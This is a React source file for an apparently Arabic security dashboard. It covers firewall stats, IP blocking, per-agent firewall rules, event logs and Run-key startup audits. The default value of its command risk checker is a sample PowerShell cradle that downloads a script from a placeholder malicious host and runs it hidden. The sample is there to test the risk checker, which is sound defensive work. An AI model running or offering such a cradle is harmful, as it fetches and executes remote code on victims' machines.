/**
 * ASAAS v2.5 - Screens _5 & _9
 * مصفوفة الدفاع السيبراني ورادار الاختراق ومحلل مخاطر الأوامر
 * Strict implementation of Stitch Prototypes _5 & _9
 */

import { useState, useEffect } from 'react';
import { Card, Button, Glass, useToast, TableContainer, Table, TableHeader, TableRow, TableHead, TableBody, TableCell } from '../asaas-ui';
import { api, type SecurityStats, type SecurityEvent } from '../lib/api';
import { apiV1 } from '../lib/apiV1';
import {
  ShieldAlert,
  CheckCircle2,
  Lock,
  Unlock,
  Terminal,
  RefreshCw,
  Bot,
  ShieldCheck,
} from 'lucide-react';
import { NavLink } from 'react-router-dom';
import { t } from '../lib/i18n';

type ResultEntry = { job_id: string; completed_at: string | null; result: unknown; error: string | null };

interface FleetSecAgent {
  id: string;
  name: string;
  status: string;
  hostname?: string | null;
  linked_asset: { id: string; name: string; hostname: string } | null;
  collector_count: number;
  firewall: ResultEntry | null;
  rules: ResultEntry | null;
  eventlog: ResultEntry | null;
  startup: ResultEntry | null;
}

interface FwProfile { profile: string; enabled: boolean | null; ruleCount: number | null }

interface FwRule {
  name: string;
  displayName: string;
  direction: string;
  action: string;
  enabled: boolean | null;
  profile: string;
}

// Heuristic row extraction for firewall.rules payloads — array or {rules|items}.
function firewallRules(result: unknown): FwRule[] {
  let arr: unknown = result;
  if (!Array.isArray(arr) && arr && typeof arr === 'object') {
    for (const k of ['rules', 'items']) {
      const v = (arr as any)[k];
      if (Array.isArray(v)) { arr = v; break; }
    }
  }
  if (!Array.isArray(arr)) {
    // PowerShell serializes a single row as a bare object — wrap it unless it's a wrapper.
    if (arr && typeof arr === 'object' && (arr as any).Name !== undefined) arr = [arr];
    else return [];
  }
  const pick = (o: any, ...keys: string[]) => {
    for (const k of keys) { const v = o?.[k]; if (v !== undefined && v !== null && v !== '') return v; }
    return '';
  };
  return (arr as unknown[])
    .filter((r: unknown) => r && typeof r === 'object')
    .map((r: any) => {
      const rawEnabled = pick(r, 'Enabled', 'enabled');
      const enabled = rawEnabled === '' ? null
        : typeof rawEnabled === 'boolean' ? rawEnabled
        : /^(true|1|enabled)$/i.test(String(rawEnabled)) ? true
        : /^(false|0|disabled)$/i.test(String(rawEnabled)) ? false
        : null;
      return {
        name: String(pick(r, 'Name', 'name') || ''),
        displayName: String(pick(r, 'DisplayName', 'display_name', 'displayName') || '?'),
        direction: String(pick(r, 'Direction', 'direction') || ''),
        action: String(pick(r, 'Action', 'action') || ''),
        enabled,
        profile: String(pick(r, 'Profile', 'profile') || ''),
      };
    });
}

// Heuristic extraction for firewall.state payloads — {profiles:[{profile,enabled,rule_count}]}.
function firewallProfiles(result: unknown): FwProfile[] {
  const arr = Array.isArray(result)
    ? result
    : Array.isArray((result as any)?.profiles)
      ? (result as any).profiles
      : null;
  if (!arr) return [];
  const pick = (o: any, ...keys: string[]) => {
    for (const k of keys) { const v = o?.[k]; if (v !== undefined && v !== null && v !== '') return v; }
    return '';
  };
  return arr
    .filter((p: unknown) => p && typeof p === 'object')
    .map((p: any) => {
      const rawEnabled = pick(p, 'enabled', 'Enabled', 'state', 'State');
      const enabled = rawEnabled === '' ? null
        : typeof rawEnabled === 'boolean' ? rawEnabled
        : /^(true|1|on|enabled)$/i.test(String(rawEnabled)) ? true
        : /^(false|0|off|disabled)$/i.test(String(rawEnabled)) ? false
        : null;
      const rc = Number(pick(p, 'rule_count', 'RuleCount', 'rules', 'ruleCount'));
      return {
        profile: String(pick(p, 'profile', 'Profile', 'name', 'Name') || '?'),
        enabled,
        ruleCount: Number.isFinite(rc) ? rc : null,
      };
    });
}

export function SecurityPage() {
  const toast = useToast();
  const [stats, setStats] = useState<SecurityStats | null>(null);
  const [events, setEvents] = useState<SecurityEvent[]>([]);
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [manualIp, setManualIp] = useState('');
  const [manualReason] = useState('Manual Security Shield Block');
  const [blocking, setBlocking] = useState(false);

  // Command Execution Risk Guard state (Stitch _5 H2)
  const [testCommand, setTestCommand] = useState('powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://malicious.cc/p.ps1\')"');
  const [commandResult, setCommandResult] = useState<any>(null);
  const [checkingCmd, setCheckingCmd] = useState(false);
  const [fleetSec, setFleetSec] = useState<FleetSecAgent[]>([]);
  const [fwRuleBusy, setFwRuleBusy] = useState<string | null>(null);
  const [startupBusy, setStartupBusy] = useState<string | null>(null);
  const [fwAddAgent, setFwAddAgent] = useState<string | null>(null);
  const [fwForm, setFwForm] = useState({ display_name: '', direction: 'inbound', rule_action: 'allow', protocol: 'any', local_port: '', profile: 'any' });

  const fetchSecurity = async () => {
    try {
      const [st, ev, blk, fleetRes] = await Promise.all([
        api.getSecurityStats(),
        api.getSecurityEvents().catch(() => []),
        api.getBlockedIps().catch(() => []),
        apiV1.fleetSummary().catch(() => null),
      ]);
      setStats(st);
      setEvents(Array.isArray(ev) ? ev : []);
      setBlockedIps(Array.isArray(blk) ? blk : []);
      if (fleetRes?.agents?.length) {
        const detailed = await Promise.all(
          fleetRes.agents.map(async (ag) => {
            let firewall: ResultEntry | null = null;
            let rules: ResultEntry | null = null;
            let eventlog: ResultEntry | null = null;
            let startup: ResultEntry | null = null;
            if (ag.collector_count > 0) {
              const r = await apiV1.agentLatestResults(ag.id).catch(() => null);
              firewall = r?.results?.['firewall.state'] ?? null;
              rules = r?.results?.['firewall.rules'] ?? null;
              eventlog = r?.results?.['eventlog.tail'] ?? null;
              startup = r?.results?.['startup.programs'] ?? null;
            }
            return { ...ag, firewall, rules, eventlog, startup };
          }),
        );
        setFleetSec(detailed);
      } else {
        setFleetSec([]);
      }
    } catch (err: any) {
      toast(err.message || t('فشل جلب بيانات الأمان'), 'error');
    }
  };

  useEffect(() => {
    fetchSecurity();
    const timer = window.setInterval(fetchSecurity, 60000);
    return () => window.clearInterval(timer);
  }, []);

  const handleBlockManual = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!manualIp.trim()) return;
    setBlocking(true);
    try {
      const res = await api.blockSecurityIp(manualIp.trim(), manualReason);
      if (res.ok) {
        toast(`${t('تم حظر عنوان IP [')}${manualIp}${t('] بجدار حماية ويندوز بنجاح.')}`, 'success');
        setManualIp('');
        fetchSecurity();
      } else {
        toast(res.error || t('فشل الحظر'), 'error');
      }
    } catch (err: any) {
      toast(err.message || t('خطأ'), 'error');
    } finally {
      setBlocking(false);
    }
  };

  const handleUnblock = async (ip: string) => {
    try {
      const res = await api.unblockSecurityIp(ip);
      if (res.ok) {
        toast(`${t('تم رفع الحظر عن عنوان IP [')}${ip}${t('] بنجاح.')}`, 'success');
        fetchSecurity();
      } else {
        toast(res.error || t('فشل رفع الحظر'), 'error');
      }
    } catch (err: any) {
      toast(err.message || t('خطأ'), 'error');
    }
  };

  const handleCheckCommand = async (cmdToTest?: string) => {
    const cmd = cmdToTest || testCommand;
    if (!cmd.trim()) return;
    setCheckingCmd(true);
    try {
      const res = await api.checkCommandRisk(cmd);
      setCommandResult(res);
      if (res?.risk_level === 'CRITICAL' || res?.risk_level === 'HIGH' || (!res?.safe)) {
        toast(t('تم رصد نمط برمجي عالي الخطورة محظور تنفيذه!'), 'error');
      } else {
        toast(t('الأمر سليم ولا يحتوي على تعليمات خبيثة.'), 'success');
      }
    } catch (err: any) {
      toast(err.message || t('خطأ أثناء تحليل الأمر'), 'error');
    } finally {
      setCheckingCmd(false);
    }
  };

  // Signed agent write job: add/remove/enable/disable a firewall rule.
  const queueFirewallRule = async (ag: FleetSecAgent, payload: Record<string, unknown>, busyKey: string) => {
    setFwRuleBusy(busyKey);
    try {
      await apiV1.createJob({ agent_id: ag.id, job_type: 'firewall.rule', payload });
      toast(t('تم إرسال أمر قاعدة الجدار الناري — ينفذ على الوكيل خلال ~15 ثانية'), 'success');
    } catch (err: any) {
      toast(err?.message || t('فشل إرسال الأمر'), 'error');
    } finally {
      setFwRuleBusy(null);
    }
  };

  // Signed agent write job: remove a Run/RunOnce autostart value.
  const queueStartupRemove = async (ag: FleetSecAgent, key: string, name: string) => {
    const busyKey = `${ag.id}:${key}:${name}`;
    setStartupBusy(busyKey);
    try {
      await apiV1.createJob({ agent_id: ag.id, job_type: 'startup.program.remove', payload: { key, name } });
      toast(t('تم إرسال أمر إزالة برنامج بدء التشغيل — ينفذ على الوكيل خلال ~15 ثانية'), 'success');
    } catch (err: any) {
      toast(err?.message || t('فشل إرسال الأمر'), 'error');
    } finally {
      setStartupBusy(null);
    }
  };

  const submitFwRule = async (ag: FleetSecAgent) => {
    if (!fwForm.display_name.trim()) { toast(t('أدخل اسم القاعدة'), 'error'); return; }
    const payload: Record<string, unknown> = {
      action: 'add',
      display_name: fwForm.display_name.trim(),
      direction: fwForm.direction,
      rule_action: fwForm.rule_action,
      protocol: fwForm.protocol,
      profile: fwForm.profile,
    };
    if (fwForm.local_port.trim()) payload.local_port = fwForm.local_port.trim();
    await queueFirewallRule(ag, payload, `add:${ag.id}`);
    setFwForm({ display_name: '', direction: 'inbound', rule_action: 'allow', protocol: 'any', local_port: '', profile: 'any' });
    setFwAddAgent(null);
  };

  const threatLevel = stats?.threat_level || 'UNKNOWN';
  const threatLabel = threatLevel === 'HIGH' ? t('مرتفع (High)') : threatLevel === 'MEDIUM' ? t('متوسط (Medium)') : threatLevel === 'LOW' ? t('منخفض (Safe)') : t('غير متاح (—)');
  const threatColor = threatLevel === 'HIGH' ? 'var(--unpaid)' : threatLevel === 'MEDIUM' ? 'var(--partial)' : threatLevel === 'LOW' ? 'var(--accent)' : 'var(--text-3)';
  const firewallActive = stats?.firewall_active ?? false;

  return (
    <div className="page">
      {/* Product page header */}
      <div className="page-hero"
        style={{
          position: 'relative',
          overflow: 'hidden',
          borderRadius: 16,
          background: 'linear-gradient(135deg, var(--glass-tint-strong) 0%, var(--surface-ground) 100%)',
          border: '1px solid var(--accent-soft)',
          boxShadow: '0 12px 32px var(--shadow-soft)',
          padding: '24px 28px',
        }}
      >
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: 16 }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <span
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: 6,
                  padding: '4px 12px',
                  borderRadius: 9999,
                  background: 'var(--paid-bg)',
                  color: 'var(--paid)',
                  fontSize: 12,
                  fontWeight: 700,
                }}
              >
                <CheckCircle2 size={13} />
                {t('درع الحماية المحيطي نشط Perimeter Guard')}
              </span>
              <span
                style={{
                  padding: '3px 10px',
                  borderRadius: 9999,
                  background: 'var(--accent-soft)',
                  color: 'var(--accent)',
                  fontSize: 11,
                  fontWeight: 700,
                }}
              >
                Fail2Ban &amp; Windows Defender Firewall
              </span>
            </div>

            <h1 style={{ fontSize: 24, fontWeight: 800, color: 'var(--text-1)', margin: 0 }}>
              {t('مصفوفة الدفاع السيبراني ورادار الاختراق (Cyber Defense Matrix)')}
            </h1>
            <p style={{ fontSize: 14, color: 'var(--text-2)', margin: 0, maxWidth: 840, lineHeight: 1.6 }}>
              {t('رصد واعتراض هجمات التخمين على منافذ RDP، كبح محاولات حقن الأوامر التخريبية في الطرفية، وحظر العناوين المشبوهة تلقائياً في جدار الحماية قبل اختراق النظام.')}
            </p>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <Button
              size="sm"
              variant="glass"
              onClick={fetchSecurity}
              style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}
            >
              <RefreshCw size={13} />
              <span>{t('تحديث القواعد الأمنية')}</span>
            </Button>
          </div>
        </div>
      </div>

      {/* 2. Top Stats Grid */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, minmax(0, 1fr))', gap: 16 }}>
        <Glass style={{ padding: 18, display: 'flex', flexDirection: 'column', gap: 4 }}>
          <span style={{ fontSize: 11, color: 'var(--text-3)', fontWeight: 600 }}>{t('الهجمات المعترضة')}</span>
          <div style={{ fontSize: 28, fontWeight: 800, color: 'var(--paid)', fontFamily: 'var(--font)' }}>
            {stats?.attacks_intercepted ?? 0}
          </div>
          <span style={{ fontSize: 11, color: 'var(--text-3)' }}>{t('اعتراض تلقائي فوري')}</span>
        </Glass>

        <Glass style={{ padding: 18, display: 'flex', flexDirection: 'column', gap: 4 }}>
          <span style={{ fontSize: 11, color: 'var(--text-3)', fontWeight: 600 }}>{t('العناوين المحظورة')}</span>
          <div style={{ fontSize: 28, fontWeight: 800, color: 'var(--unpaid)', fontFamily: 'var(--font)' }}>
            {blockedIps.length > 0 ? blockedIps.length : (stats?.blocked_ips_count ?? 0)}
          </div>
          <span style={{ fontSize: 11, color: 'var(--text-3)' }}>{t('في جدار حماية ويندوز')}</span>
        </Glass>

        <Glass style={{ padding: 18, display: 'flex', flexDirection: 'column', gap: 4 }}>
          <span style={{ fontSize: 11, color: 'var(--text-3)', fontWeight: 600 }}>{t('مستوى التهديد العام')}</span>
          <div style={{ fontSize: 28, fontWeight: 800, color: threatColor }}>
            {threatLabel}
          </div>
          <span style={{ fontSize: 11, color: firewallActive ? 'var(--paid)' : 'var(--unpaid)' }}>
            ● {firewallActive ? t('جدار الحماية نشط') : t('جدار الحماية غير نشط')}
          </span>
        </Glass>

        <Glass style={{ padding: 18, display: 'flex', flexDirection: 'column', gap: 4 }}>
          <span style={{ fontSize: 11, color: 'var(--text-3)', fontWeight: 600 }}>{t('حماية جلسات RDP')}</span>
          <div style={{ fontSize: 28, fontWeight: 800, color: 'var(--chart-out)' }}>
            {t('NLA مشفر')}
          </div>
          <span style={{ fontSize: 11, color: 'var(--text-3)' }}>Network Level Auth</span>
        </Glass>
      </div>

      {/* 2b. ASAAS remote agent security — real firewall/eventlog collector results */}
      {fleetSec.length > 0 && (
        <Glass style={{ padding: 22, display: 'flex', flexDirection: 'column', gap: 14 }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 10 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <div style={{ width: 36, height: 36, borderRadius: 10, background: 'var(--accent-soft)', border: '1px solid var(--accent-soft)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'var(--accent)' }}>
                <ShieldCheck size={20} />
              </div>
              <div>
                <h2 style={{ fontSize: 16, fontWeight: 700, color: 'var(--text-1)', margin: 0 }}>
                  {t('درع أساس عن بُعد (Remote Agent Shield)')}
                </h2>
                <span style={{ fontSize: 11, color: 'var(--text-3)' }}>
                  {t('حالة جدار الحماية وأحدث أحداث السجل من وكلاء Asaas.Agent — بيانات حقيقية مجمعة')}
                </span>
              </div>
            </div>
            <NavLink to="/agents" style={{ fontSize: 12, color: 'var(--accent)', fontWeight: 700, textDecoration: 'none' }}>
              {t('إدارة الوكلاء')} ←
            </NavLink>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: 12 }}>
            {fleetSec.map((ag) => (
              <div key={ag.id} style={{ border: '1px solid var(--hairline)', borderRadius: 12, padding: '14px 16px', background: 'var(--glass-tint)' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 10 }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <Bot size={15} style={{ color: 'var(--accent)' }} />
                    <span style={{ fontSize: 13, fontWeight: 800, color: 'var(--text)' }}>{ag.linked_asset?.name || ag.name}</span>
                  </div>
                  <span style={{ fontSize: 10, fontWeight: 700, padding: '2px 8px', borderRadius: 999, background: ag.status === 'online' ? 'var(--paid-bg)' : 'var(--surface-glass-tint)', color: ag.status === 'online' ? 'var(--paid)' : 'var(--text-3)' }}>
                    {ag.status}
                  </span>
                </div>
                <div style={{ fontSize: 11, color: 'var(--text-3)', fontFamily: 'var(--font-telemetry)', direction: 'ltr', textAlign: 'left', marginBottom: 10 }}>
                  {ag.hostname || ag.id.slice(0, 8)}
                </div>

                {/* firewall.state — structured per-profile state */}
                {(() => {
                  const entry = ag.firewall;
                  const profiles = entry && !entry.error ? firewallProfiles(entry.result) : [];
                  return (
                    <div style={{ marginBottom: 8, border: '1px solid var(--hairline)', borderRadius: 8, padding: '8px 10px' }}>
                      <div style={{ fontSize: 11, fontWeight: 700, color: 'var(--text-2)', display: 'flex', justifyContent: 'space-between', gap: 8, marginBottom: profiles.length ? 8 : 0 }}>
                        <span>{t('حالة جدار الحماية')}</span>
                        <span style={{ fontSize: 10, color: 'var(--text-3)', fontWeight: 400 }}>
                          {entry ? (entry.completed_at ? new Date(entry.completed_at).toLocaleString('ar-SA') : '—') : t('لا بيانات')}
                        </span>
                      </div>
                      {!entry ? (
                        <div style={{ fontSize: 11, color: 'var(--text-3)' }}>{t('لم يُرسل هذا الجامع بعد — أرسله من صفحة الوكلاء.')}</div>
                      ) : entry.error ? (
                        <div className="text-status-danger" style={{ fontSize: 11 }}>{entry.error}</div>
                      ) : profiles.length === 0 ? (
                        <details style={{ fontSize: 11 }}>
                          <summary style={{ cursor: 'pointer', color: 'var(--text-3)' }}>{t('نتيجة غير معروفة — عرض خام')}</summary>
                          <pre dir="ltr" style={{ margin: '8px 0 0', fontSize: 10, fontFamily: 'var(--font-telemetry)', color: 'var(--text-2)', whiteSpace: 'pre-wrap', wordBreak: 'break-word', maxHeight: 160, overflowY: 'auto' }}>
                            {JSON.stringify(entry.result, null, 2)}
                          </pre>
                        </details>
                      ) : (
                        <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                          {profiles.map((p, i) => (
                            <div key={i} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 8, fontSize: 10, padding: '4px 8px', borderRadius: 6, background: 'var(--surface-ground)' }}>
                              <span style={{ fontWeight: 700, color: 'var(--text)', direction: 'ltr' }}>{p.profile}</span>
                              <span style={{ display: 'flex', gap: 8, color: 'var(--text-3)' }}>
                                {p.ruleCount !== null && <span>{p.ruleCount} {t('قاعدة')}</span>}
                                <span style={{ color: p.enabled === false ? 'var(--unpaid)' : 'var(--paid)' }}>
                                  {p.enabled === true ? t('مفعّل') : p.enabled === false ? t('معطّل') : '—'}
                                </span>
                              </span>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  );
                })()}

                {/* firewall.rules — signed firewall.rule write jobs per agent */}
                {(() => {
                  const entry = ag.rules;
                  const rules = entry && !entry.error ? firewallRules(entry.result) : [];
                  return (
                    <details style={{ marginBottom: 8, border: '1px solid var(--hairline)', borderRadius: 8, padding: '8px 10px' }}>
                      <summary style={{ fontSize: 11, fontWeight: 700, color: 'var(--text-2)', cursor: 'pointer', display: 'flex', justifyContent: 'space-between', gap: 8 }}>
                        <span>{t('قواعد جدار الحماية')}</span>
                        <span style={{ fontSize: 10, color: 'var(--text-3)', fontWeight: 400 }}>
                          {entry ? `${rules.length} ${t('قاعدة')}` : t('لا بيانات')}
                        </span>
                      </summary>
                      {!entry ? (
                        <div style={{ fontSize: 11, color: 'var(--text-3)', marginTop: 6 }}>{t('لم يُرسل جامع القواعد بعد — أرسله من صفحة الوكلاء (firewall.rules).')}</div>
                      ) : entry.error ? (
                        <div className="text-status-danger" style={{ fontSize: 11, marginTop: 6 }}>{entry.error}</div>
                      ) : rules.length === 0 ? (
                        <div style={{ fontSize: 11, color: 'var(--text-3)', marginTop: 6 }}>{t('لا قواعد أو نتيجة غير معروفة.')}</div>
                      ) : (
                        <div style={{ marginTop: 8, display: 'flex', flexDirection: 'column', gap: 6 }}>
                          <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                            <button
                              type="button"
                              onClick={() => setFwAddAgent(fwAddAgent === ag.id ? null : ag.id)}
                              style={{ fontSize: 10, padding: '2px 8px', borderRadius: 6, cursor: 'pointer', border: '1px solid var(--accent-soft)', background: 'var(--accent-soft)', color: 'var(--accent)', fontWeight: 700 }}
                            >
                              {fwAddAgent === ag.id ? t('إلغاء') : `+ ${t('قاعدة جديدة')}`}
                            </button>
                          </div>
                          {fwAddAgent === ag.id && (
                            <div style={{ border: '1px solid var(--accent-soft)', borderRadius: 8, padding: '10px 12px', display: 'flex', flexDirection: 'column', gap: 8, background: 'var(--surface-ground)' }}>
                              <input
                                value={fwForm.display_name}
                                onChange={(e) => setFwForm({ ...fwForm, display_name: e.target.value })}
                                placeholder={t('اسم القاعدة (DisplayName)')}
                                style={{ fontSize: 11, padding: '5px 8px', borderRadius: 6, border: '1px solid var(--hairline)', background: 'transparent', color: 'var(--text)' }}
                              />
                              <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                                <select value={fwForm.direction} onChange={(e) => setFwForm({ ...fwForm, direction: e.target.value })} style={{ fontSize: 10, padding: '4px 6px', borderRadius: 6, border: '1px solid var(--hairline)', background: 'var(--surface-ground)', color: 'var(--text)' }}>
                                  <option value="inbound">{t('وارد')}</option>
                                  <option value="outbound">{t('صادر')}</option>
                                </select>
                                <select value={fwForm.rule_action} onChange={(e) => setFwForm({ ...fwForm, rule_action: e.target.value })} style={{ fontSize: 10, padding: '4px 6px', borderRadius: 6, border: '1px solid var(--hairline)', background: 'var(--surface-ground)', color: 'var(--text)' }}>
                                  <option value="allow">{t('سماح')}</option>
                                  <option value="block">{t('حظر')}</option>
                                </select>
                                <select value={fwForm.protocol} onChange={(e) => setFwForm({ ...fwForm, protocol: e.target.value })} style={{ fontSize: 10, padding: '4px 6px', borderRadius: 6, border: '1px solid var(--hairline)', background: 'var(--surface-ground)', color: 'var(--text)' }}>
                                  <option value="any">{t('أي بروتوكول')}</option>
                                  <option value="tcp">TCP</option>
                                  <option value="udp">UDP</option>
                                </select>
                                <select value={fwForm.profile} onChange={(e) => setFwForm({ ...fwForm, profile: e.target.value })} style={{ fontSize: 10, padding: '4px 6px', borderRadius: 6, border: '1px solid var(--hairline)', background: 'var(--surface-ground)', color: 'var(--text)' }}>
                                  <option value="any">{t('كل الملفات')}</option>
                                  <option value="domain">Domain</option>
                                  <option value="private">Private</option>
                                  <option value="public">Public</option>
                                </select>
                                <input
                                  value={fwForm.local_port}
                                  onChange={(e) => setFwForm({ ...fwForm, local_port: e.target.value })}
                                  placeholder={t('منفذ محلي (مثال 443)')}
                                  dir="ltr"
                                  style={{ fontSize: 10, padding: '4px 6px', borderRadius: 6, border: '1px solid var(--hairline)', background: 'transparent', color: 'var(--text)', width: 110 }}
                                />
                              </div>
                              <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                                <Button size="sm" variant="primary" loading={fwRuleBusy === `add:${ag.id}`} disabled={!fwForm.display_name.trim()} onClick={() => void submitFwRule(ag)} style={{ fontSize: 11 }}>
                                  {t('إضافة القاعدة')}
                                </Button>
                              </div>
                            </div>
                          )}
                          <div style={{ display: 'flex', flexDirection: 'column', gap: 4, maxHeight: 240, overflowY: 'auto' }}>
                            {rules.slice(0, 40).map((r, i) => {
                              const key = `${ag.id}:${r.name || r.displayName}:${i}`;
                              const isBlock = /block/i.test(r.action);
                              return (
                                <div key={key} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 8, fontSize: 10, padding: '4px 8px', borderRadius: 6, background: 'var(--surface-ground)' }}>
                                  <span style={{ fontWeight: 700, color: 'var(--text)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', direction: 'ltr', textAlign: 'left', flex: 1 }} title={r.name}>
                                    {r.displayName}
                                  </span>
                                  <span style={{ display: 'flex', gap: 6, flexShrink: 0, color: 'var(--text-3)', alignItems: 'center', flexWrap: 'wrap', justifyContent: 'flex-end' }}>
                                    {r.direction && <span>{r.direction === 'Inbound' ? t('وارد') : r.direction === 'Outbound' ? t('صادر') : r.direction}</span>}
                                    <span style={{ color: isBlock ? 'var(--unpaid)' : 'var(--paid)' }}>{isBlock ? t('حظر') : t('سماح')}</span>
                                    <span style={{ color: r.enabled === false ? 'var(--unpaid)' : 'var(--paid)' }}>
                                      {r.enabled === true ? t('مفعّلة') : r.enabled === false ? t('معطّلة') : '—'}
                                    </span>
                                    {r.name && (
                                      <>
                                        <button
                                          type="button"
                                          disabled={fwRuleBusy !== null}
                                          onClick={() => void queueFirewallRule(ag, { action: r.enabled === false ? 'enable' : 'disable', name: r.name }, `tgl:${key}`)}
                                          style={{ fontSize: 9, padding: '1px 6px', borderRadius: 4, cursor: fwRuleBusy ? 'wait' : 'pointer', border: '1px solid var(--glass-rim)', background: 'transparent', color: 'var(--accent)' }}
                                        >
                                          {fwRuleBusy === `tgl:${key}` ? '…' : r.enabled === false ? t('تفعيل') : t('تعطيل')}
                                        </button>
                                        <button
                                          type="button"
                                          disabled={fwRuleBusy !== null}
                                          onClick={() => { if (window.confirm(t(`حذف قاعدة الجدار الناري «${r.displayName}» على ${ag.linked_asset?.name || ag.name || ag.hostname || ag.id.slice(0, 8)}؟`))) void queueFirewallRule(ag, { action: 'remove', name: r.name }, `del:${key}`); }}
                                          style={{ fontSize: 9, padding: '1px 6px', borderRadius: 4, cursor: fwRuleBusy ? 'wait' : 'pointer', border: '1px solid var(--glass-rim)', background: 'transparent', color: 'var(--status-danger, #dc2626)' }}
                                        >
                                          {fwRuleBusy === `del:${key}` ? '…' : t('حذف')}
                                        </button>
                                      </>
                                    )}
                                  </span>
                                </div>
                              );
                            })}
                            {rules.length > 40 && <div style={{ fontSize: 10, color: 'var(--text-3)' }}>+{rules.length - 40} {t('قاعدة أخرى')}</div>}
                            {entry.completed_at && (
                              <div style={{ fontSize: 10, color: 'var(--text-3)' }}>{t('آخر قياس')}: {new Date(entry.completed_at).toLocaleString('ar-SA')}</div>
                            )}
                          </div>
                        </div>
                      )}
                    </details>
                  );
                })()}

                {/* eventlog.tail — raw JSON details (unchanged) */}"

                {(() => {
                  const entry = ag.eventlog;
                  const label = t('أحداث سجل النظام');
                  return (
                    <details style={{ marginBottom: 8, border: '1px solid var(--hairline)', borderRadius: 8, padding: '8px 10px' }}>
                      <summary style={{ fontSize: 11, fontWeight: 700, color: 'var(--text-2)', cursor: 'pointer', display: 'flex', justifyContent: 'space-between', gap: 8 }}>
                        <span>{label}</span>
                        <span style={{ fontSize: 10, color: 'var(--text-3)', fontWeight: 400 }}>
                          {entry ? (entry.completed_at ? new Date(entry.completed_at).toLocaleString('ar-SA') : '—') : t('لا بيانات')}
                        </span>
                      </summary>
                      {!entry ? (
                        <div style={{ fontSize: 11, color: 'var(--text-3)', marginTop: 6 }}>{t('لم يُرسل هذا الجامع بعد — أرسله من صفحة الوكلاء.')}</div>
                      ) : entry.error ? (
                        <div className="text-status-danger" style={{ fontSize: 11, marginTop: 6 }}>{entry.error}</div>
                      ) : (
                        <pre dir="ltr" style={{ margin: '8px 0 0', fontSize: 10, fontFamily: 'var(--font-telemetry)', color: 'var(--text-2)', whiteSpace: 'pre-wrap', wordBreak: 'break-word', maxHeight: 160, overflowY: 'auto' }}>
                          {JSON.stringify(entry.result, null, 2)}
                        </pre>
                      )}
                    </details>
                  );
                })()}

                {/* startup.programs — Run/RunOnce persistence audit */}
                {(() => {
                  const entry = ag.startup;
                  const raw = entry && !entry.error ? entry.result : null;
                  const src = Array.isArray(raw) ? raw : ((raw as any)?.items ?? (raw as any)?.programs ?? []);
                  const rows = Array.isArray(src) ? src.filter((x) => x && typeof x === 'object') : [];
                  return (
                    <details style={{ border: '1px solid var(--hairline)', borderRadius: 8, padding: '8px 10px' }}>
                      <summary style={{ fontSize: 11, fontWeight: 700, color: 'var(--text-2)', cursor: 'pointer', display: 'flex', justifyContent: 'space-between', gap: 8 }}>
                        <span>{t('برامج بدء التشغيل (Run keys)')}</span>
                        <span style={{ fontSize: 10, color: 'var(--text-3)', fontWeight: 400 }}>
                          {entry ? (rows.length ? `${rows.length} ${t('عنصر')}` : (entry.completed_at ? new Date(entry.completed_at).toLocaleString('ar-SA') : '—')) : t('لا بيانات')}
                        </span>
                      </summary>
                      {!entry ? (
                        <div style={{ fontSize: 11, color: 'var(--text-3)', marginTop: 6 }}>{t('لم يُرسل هذا الجامع بعد — أرسله من صفحة الوكلاء.')}</div>
                      ) : entry.error ? (
                        <div className="text-status-danger" style={{ fontSize: 11, marginTop: 6 }}>{entry.error}</div>
                      ) : rows.length === 0 ? (
                        <div style={{ fontSize: 11, color: 'var(--text-3)', marginTop: 6 }}>{t('لا مفاتيح Run أو نتيجة غير معروفة.')}</div>
                      ) : (
                        <div style={{ display: 'flex', flexDirection: 'column', gap: 4, marginTop: 8, maxHeight: 180, overflowY: 'auto' }}>
                          {rows.slice(0, 30).map((r: any, i: number) => (
                            <div key={i} style={{ border: '1px solid var(--hairline)', borderRadius: 6, padding: '6px 8px', background: 'var(--surface-ground)' }}>
                              <div style={{ display: 'flex', justifyContent: 'space-between', gap: 8, marginBottom: 2 }}>
                                <span style={{ fontSize: 10, fontWeight: 700, color: 'var(--text)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', direction: 'ltr', textAlign: 'left' }}>
                                  {String(r.name ?? r.Name ?? '?')}
                                </span>
                                <span style={{ fontSize: 9, color: 'var(--text-3)', flexShrink: 0, fontFamily: 'var(--font-telemetry)' }}>
                                  {String(r.hive ?? '')}{String(r.key ?? '').includes('RunOnce') ? ' · RunOnce' : ''}
                                </span>
                              </div>
                              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: 8 }}>
                                <div style={{ fontSize: 9, color: 'var(--text-3)', fontFamily: 'var(--font-telemetry)', direction: 'ltr', textAlign: 'left', wordBreak: 'break-all', whiteSpace: 'pre-wrap', flex: 1 }}>
                                  {String(r.command ?? r.Command ?? '')}
                                </div>
                                <button
                                  type="button"
                                  disabled={startupBusy !== null}
                                  onClick={() => {
                                    const rk = String(r.key ?? '');
